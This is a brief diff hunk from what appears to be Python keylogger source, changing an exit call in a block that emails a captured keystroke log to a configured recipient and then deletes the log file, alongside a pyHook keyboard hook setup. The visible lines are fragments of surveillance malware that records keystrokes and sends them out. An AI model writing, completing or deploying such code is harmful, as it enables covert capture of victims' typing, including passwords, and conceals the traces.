@@ -181,7 +181,7 @@ try:
         fob.close
         send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
         os.remove(log_file)
-        sys.exit(0)
+        exit(1)
           
     hooks_manager = pyHook.HookManager()
     hooks_manager.KeyDown = OnKeyboardEvent
